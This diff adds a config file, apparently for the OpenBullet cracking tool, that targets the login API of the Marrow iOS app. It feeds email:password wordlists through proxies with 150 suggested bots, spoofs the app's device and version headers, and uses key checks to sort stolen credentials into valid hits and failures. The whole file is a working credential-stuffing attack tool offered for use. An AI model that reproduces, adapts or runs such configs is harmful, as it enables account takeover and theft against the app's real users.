@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "Marrow iOS Api",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-16T19:38:40.0870922+04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api-i0.marrow.com/v3.1/login_email" 
+  CONTENT "{\"enc_data\":\"login\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api-i0.marrow.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Dr-Dv-Osv: iOS 15.3.1" 
+  HEADER "Accept: */*" 
+  HEADER "Dr-Platform: ios" 
+  HEADER "Dr-Dv-Enc: SvPZbPYCFaOvEDmQWbvNXcdF51+M+tC1PMzEz9ZjZIw1ZtKd7uxXYj7aj0gRLj/a5g==" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Dr-Dv: m.D7BF5ABC-B6E0-4DA0-A6EF-F8ED9F708DAA" 
+  HEADER "Content-Length: 628" 
+  HEADER "User-Agent: Marrow/8.1.0 (org.dailyrounds.marrow; build:298; iOS 15.3.1; iPhone 7" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Dr-Dv-Ts: 1647444354383" 
+  HEADER "Dr-App: Marrow" 
+  HEADER "Dr-App-Version: 298" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"code\":412" 
+    KEY "Sorry, The email id or password that you entered is incorrect." 
+    KEY "\"status\":\"failed\"}" 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"success\"}" 
+    KEY "<SOURCE>" DoesNotContain "\"status\":\"failed\"}" 
+
